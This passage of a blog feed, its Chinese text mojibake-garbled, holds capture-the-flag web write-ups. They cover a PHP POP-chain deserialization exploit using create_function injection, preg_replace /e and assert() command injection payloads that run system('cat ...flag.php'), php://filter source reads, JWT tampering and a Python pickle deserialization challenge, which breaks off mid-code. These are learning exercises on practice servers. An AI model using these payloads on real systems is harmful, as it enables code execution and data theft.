class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç±»A"><a href="#ç±»A" class="headerlink" title="ç±»A"></a>ç±»A</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»Aæ¯”è¾ƒç®€å•</p><p>å…ˆå®šä¹‰å…¬å…±å˜é‡</p><h6 id="PHPä¸­çš„-thisç”¨æ³•ï¼š"><a href="#PHPä¸­çš„-thisç”¨æ³•ï¼š" class="headerlink" title="PHPä¸­çš„$thisç”¨æ³•ï¼š"></a>PHPä¸­çš„$thisç”¨æ³•ï¼š</h6><p>thisæ˜¯æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆ</p><p><img src="/2021/09/25/buu/23/image-20210925201706608.png" alt="image-20210925201706608"></p><h6 id="invoke-å‡½æ•°"><a href="#invoke-å‡½æ•°" class="headerlink" title="__invoke()å‡½æ•°"></a>__invoke()å‡½æ•°</h6><p>å½“ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶è¢«è°ƒç”¨</p><h5 id="ç±»B"><a href="#ç±»B" class="headerlink" title="ç±»B"></a>ç±»B</h5><pre><code>class B&#123;    public $func;    public $arg;public function show()&#123;    $func = $this-&gt;func;    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;        die(&#39;No!No!No!&#39;);    &#125; else &#123;        include &quot;flag.php&quot;;        //There is no code to print flag in flag.php        $func(&#39;&#39;, $this-&gt;arg);    &#125;&#125;public function __toString()&#123;    $this-&gt;show();    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;&#125;&#125;</code></pre><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>å½“å¯¹è±¡ä¸ºå­—ç¬¦ä¸²æ—¶è§¦å‘</p><p>æ€è·¯ï¼š</p><p>newä¸¤ä¸ªæ–°çš„aç±»å’Œbç±»å˜é‡</p><p>ç„¶åbç±»è°ƒç”¨create_functionå‡½æ•°æ–¹æ³•ï¼š</p><p><code>create_function()</code>ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆ<code>lambda</code>æ ·å¼ï¼‰ã€‚</p><p>create_function()å‡½æ•°ä¼šåœ¨å†…éƒ¨æ‰§è¡Œ eval()<a href="https://www.cnblogs.com/-qing-/p/10816089.html">ä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° - å¿å…ˆç”Ÿ - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p>å˜é‡bèµ‹å€¼<br>}è¿™ä¸ªæ˜¯ä¸ºäº†é—­åˆå‰é¢çš„<br>//è¿™ä¸ªæ˜¯ä¸ºäº†æ³¨é‡Šåé¢çš„</p><p>base64ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œvar_dumpè¾“å‡ºæ•°æ®ï¼Œget_defined_vars()å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;var&#x3D;$b;</span><br></pre></td></tr></table></figure><p>å°†bçš„å€¼ä¸aè”ç³»ï¼Œè§¦å‘_invokeå‡½æ•°ä»è€Œè§¦å‘show()</p><p>æœ€åå†åºåˆ—åŒ–a</p><p>ä¸è¿‡æˆ‘ä»¬å¾—å…ˆæ‰¾åˆ°flagåˆ°åº•åœ¨å“ªä¸ªæ–‡ä»¶é‡Œï¼š</p><p>ç»è¿‡çƒ­å¿ƒåŒå­¦çš„å¸®åŠ©ï¼Œä»Šå¤©æ‰æ‡‚å¾— include flag.php åŒ…å«çš„æ„æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å°±ç›¸å½“äºç°åœ¨flag.phpé‡Œé¢çš„å˜é‡å·²ç»åŒæ­¥åˆ°æˆ‘ç°åœ¨è¿™ä¸ªphpæ–‡ä»¶é‡Œé¢</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ¯”å¦‚è¯´æˆ‘åœ¨1.php å†™include â€œflag.phpâ€</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆè¿™ä¸ªæ—¶å€™</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.phpé‡Œé¢å®šä¹‰è¿‡çš„å˜é‡è¿˜æœ‰å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ‘åœ¨1.phpé‡Œé¢ä¹Ÿå¯ä»¥ç”¨</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨èµ‹å€¼æ—¶å…ˆç›´æ¥æ‰“å°å½“å‰phpæ–‡ä»¶çš„å˜é‡å€¼(ä¹Ÿå°±æ˜¯ç›¸å½“äºæ‰“å°flag.phpé‡Œçš„å†…å®¹)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210926192749869.png" alt="image-20210926192749869"></p><p>æ”¾ä¸Šexpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;func=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">$b-&gt;arg=<span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è·‘å‡ºpopé“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;s:3:&quot;arg&quot;;s:73:&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210925200601616.png" alt="image-20210925200601616"></p><p>ä¹‹åå†çœ‹çœ‹è¿™ç¯‡æ–‡ç« </p><p>[phpååºåˆ—åŒ–ä¹‹popé“¾_L1ni01-CSDNåšå®¢_popé“¾](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POPé“¾ä»‹ç»</a> POP é¢å‘å±æ€§ç¼–ç¨‹ (Property-Oriented,Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ ä»ç°æœ‰è¿è¡Œç¯å¢ƒ ä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾%2Cæœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„)</p><p>ç»è¿‡æç¤ºçŸ¥é“è¿™é¢˜å’ŒBJDCTFçš„ezphpå¾ˆåƒ</p><h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - åšå®¢å›­ (cnblogs.com)</a></p><p>è¿™ä¸€ç¯‡æ–‡ç« è§£é‡Šäº†å‰é¢é—­åˆçš„é—®é¢˜:</p><p><img src="/2021/09/25/buu/23/image-20210926202437436.png" alt="image-20210926202437436"></p><p>è¿™æ ·ä»£ç å®é™…å°±åªæ‰§è¡Œäº†return $arg  è¿™ä¸€å¥ï¼Œå®Œæˆäº†é€ƒé€¸</p><p><strong>PHP çš„ <code>create_function()</code> ä»£ç æ³¨å…¥</strong></p><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup â€“ é¢–å¥‡Lâ€™Amore (gem-love.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ics-05&amp;&amp;mfw</title>
      <link href="/2021/09/23/web/1/"/>
      <url>/2021/09/23/web/1/</url>
      
        <content type="html"><![CDATA[<p> ç®€ç•¥è¯´ä¸‹æ€è·¯</p><h4 id="ics-05ï¼š"><a href="#ics-05ï¼š" class="headerlink" title="ics-05ï¼š"></a>ics-05ï¼š</h4><p>è¿™é¢˜åº”è¯¥ç®—å¾ˆæ—©ä¹‹å‰å†™è¿‡äº†ï¼Œç»“æœåˆå¿˜äº†ã€‚ã€‚ã€‚</p><p>åœ¨ä¸€ä¸ªé¡µé¢é‡Œæœ‰ç€å˜é‡pageå¯æ§</p><p><img src="/2021/09/23/web/1/image-20210924195014659.png" alt="image-20210924195014659"></p><p>ç„¶åç”¨phpä¼ªåè®®è¯»å–ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:filter<span class="comment">//read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924195146901.png" alt="image-20210924195146901"></p><p>è§£ç å</p><p>é€‰å–é‡è¦çš„æ¥è¯´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$pattern = $_GET[pat];</span><br><span class="line">$replacement = $_GET[rep];</span><br><span class="line">$subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">    preg_replace($pattern, $replacement, $subject);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬ç”¨xffå¤´ç»•è¿‡</p><p>åŒæ—¶åˆ©ç”¨preg_replaceå‡½æ•°çš„æ¼æ´</p><p>preg_replace( pattern , replacement , subject ) :</p><p>å½“preg_replaceçš„å‚æ•°patternè¾“å…¥/eçš„æ—¶å€™ ,å‚æ•°replacementçš„ä»£ç å½“ä½œPHPä»£ç æ‰§è¡Œï¼ˆç›¸å½“äºevalæ¼æ´æ‰§è¡Œï¼‰</p><h5 id="preg-repleaceæ¼æ´è¯¦æƒ…"><a href="#preg-repleaceæ¼æ´è¯¦æƒ…" class="headerlink" title="preg_repleaceæ¼æ´è¯¦æƒ…"></a>preg_repleaceæ¼æ´è¯¦æƒ…</h5><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() /eä»£ç æ‰§è¡Œæ¼æ´_2021ï¼çš„åšå®¢-CSDNåšå®¢</a></p><p>äºæ˜¯æ„é€ payload</p><p>ä¹‹ågetå‹å˜é‡æ¥è¯»æ–‡ä»¶</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;txt</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200141437.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;cat+s3chahahaDir&#x2F;flag&#x2F;flag.php&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200335525.png" alt="image-20210924200141437"></p><h4 id="mfwï¼š"><a href="#mfwï¼š" class="headerlink" title="mfwï¼š"></a>mfwï¼š</h4><p>è¿™é¢˜è¯•ç€è§£äº†ä¸‹</p><p>æŒ‰ç…§æºç æç¤ºç§˜å¯†åœ¨?page=flag</p><p>äºæ˜¯è®¿é—®ï¼Œæ²¡ä»€ä¹ˆå‘ç°</p><p><img src="/2021/09/23/web/1/image-20210924200629448.png" alt="image-20210924200629448"></p><p>æˆ‘çªå‘å¥‡æƒ³ç”¨ç›®å½•éå†</p><p><img src="/2021/09/23/web/1/image-20210924200718261.png" alt="image-20210924200718261"></p><p>å¥½å®¶ä¼™ï¼Œé¡µé¢å›æ˜¾å‘ç°é»‘å®¢è­¦å‘Šï¼Œè‚¯å®šè¢«è¿‡æ»¤äº†</p><p>è¿™æ—¶å€™é‡‡ç”¨dirsearchæ‰«æï¼Œæœç„¶æœ‰äº†.gitæ³„éœ²</p><p>æ‰€ä»¥å†ä½¿ç”¨å·¥å…·GitHackä¸‹è½½æºç </p><p><img src="/2021/09/23/web/1/image-20210924200852766.png" alt="image-20210924200852766"></p><p>çœ‹çœ‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">   $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;<span class="comment">//è¿æ¥å˜é‡ä¸è·¯å¾„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);<span class="comment">//è¿™å°±æ˜¯ä¹‹å‰æˆ‘ç›®å½•éå†çš„æ—¶å€™è¢«è¿‡æ»¤çš„åœ°æ–¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;about.php%27%2c+%27123%27)+%3d%3d%3d+false+and+system(%27cat+t  emplates%2fflag.php%27)+and+strpos(%27templates%2fflag</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924201624926.png" alt="image-20210924201624926"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ”»é˜²ä¸–ç•Œ_web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 ååŒ—èµ›åŒº Day1 Web2 ikun</title>
      <link href="/2021/09/21/buu/22/"/>
      <url>/2021/09/21/buu/22/</url>
      
        <content type="html"><![CDATA[<p> ç»å†äº†ä¸€ä¸ªä¸ŠåˆAWDçš„è¢«é”¤å</p><p>æœ‰ç‚¹å¿ƒç°æ„å†·</p><p>åšäº†å¥½å¤šé¢˜ç›®éƒ½æ˜¯è·Ÿç€wpåšçš„ï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·</p><p>æœ¬æ¥æ‰¾äº†ly0nå¤§ä½¬å–ç»äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°è‡ªå·±è¿˜æ˜¯åŸºç¡€æ²¡æ‰“å¥½</p><p>è¿™é“é¢˜è¿˜æ˜¯è·Ÿç€wpåšäº†ä¸€é</p><p>å…ˆè®°å½•ä¸€ä¸‹æ€è·¯</p><p>è¿›å»ä¹‹åæ˜¯ä¸ªè´­ç‰©é¡µé¢ï¼Œå¾ˆå¤š* li *liæ ‡å¿—å°ç”µè§†çš„å•†å“</p><p>æŒ‰ç…§æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ä¹°lv6çš„æ‰è¡Œ</p><p>ç¿»é¡µå¯»æ‰¾äº†å¥½ä¹…éƒ½æ²¡æœ‰</p><p>åŸç†æ˜¯è¦ç”¨è„šæœ¬è·‘ä¸€ä¸‹å•Š</p><p>å¾ˆå¿«ï¼Œæ‰¾åˆ°äº†ç¬¬180é¡µæœ‰è¿™ä¸ªå•†å“</p><p>ä½†æ˜¯å¤ªè´µäº†ï¼Œè¿œè¿œè¶…å‡ºæˆ‘ä»¬çš„é’±åŒ…</p><p>äºæ˜¯æŠ“åŒ…æƒ³ä¿®æ”¹æŠ˜æ‰£è’™æ··è¿‡å…³</p><p>å¥½å®¶ä¼™ï¼Œè¯´æ²¡æœ‰ä»¥adminè®¿é—®ä¸è¡Œ</p><p>ç„¶åçŸ¥é“äº†è¦ä»jwtå…¥æ‰‹ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæœ‰ç‚¹åƒä»¤ç‰Œtokenå’Œcookieå§</p><p>å°±æ˜¯æµè§ˆå™¨ç”¨è¿™ä¸ªä¸œè¥¿æ¥è¯†åˆ«ä½ çš„èº«ä»½</p><p>è¿›å…¥jwtå®˜æ–¹é¡µé¢ä¿®æ”¹ä¹‹åæˆåŠŸè´­ä¹°</p><p>æŸ¥çœ‹æºç </p><p>æç¤ºæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶</p><p>ä¸‹è½½ä¹‹åå°±æ˜¯éš¾ç‚¹pythonçš„pickleæ¼æ´</p><p><strong>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚</strong></p><p>åšé¢˜ï¼š</p><p><img src="/2021/09/21/buu/22/image-20210924202100689.png" alt="image-20210924202100689"></p><p>æŒ‰ç…§æç¤ºï¼Œåˆ©ç”¨è„šæœ¬å¯»æ‰¾ä¸€ä¸‹lv6çš„è¸ªè¿¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&quot;http://06312721-18d2-4fee-bac0-d6591cf2e757.node4.buuoj.cn:81/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">    url = url.format(i)</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">&quot;find it:&quot;</span> ,url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/21/buu/22/image-20210924202357414.png" alt="image-20210924202357414"></p><p>è®¿é—®page181</p><p><img src="/2021/09/21/buu/22/image-20210924202458922.png" alt="image-20210924202458922"></p><p>æ‰¾åˆ°è¿™ä¸ªåˆºå¤´äº†ï¼Œä¹°å®ƒï¼ï¼ï¼</p><p>ç»“æœï¼Œæ“ä½œå¤±è´¥hh</p><p><img src="/2021/09/21/buu/22/image-20210924202659335.png" alt="image-20210924202659335"></p><p>å·å·æ”¾è¿›æŠ“åŒ…é‡Œä¿®æ”¹é‡‘é¢</p><p><img src="/2021/09/21/buu/22/image-20210924203723295.png" alt="image-20210924203723295"></p><p>æç¤ºæˆ‘ä»¬éœ€è¦adminæƒé™å•Š</p><p>è·³è¿‡äº†å¾—åˆ°å¯†é’¥ä¸€æ­¥</p><p>JWTä¿®æ”¹</p><p><img src="/2021/09/21/buu/22/image-20210924204157770.png" alt="image-20210924204157770"></p><p>æˆåŠŸè®¿é—®</p><p><img src="/2021/09/21/buu/22/image-20210924204354932.png" alt="image-20210924204354932"></p><p><img src="/2021/09/21/buu/22/image-20210924204124430.png" alt="image-20210924204124430"></p><p>æŒ‰ç…§æç¤ºä¸‹è½½æºç </p><p>æŸ¥çœ‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 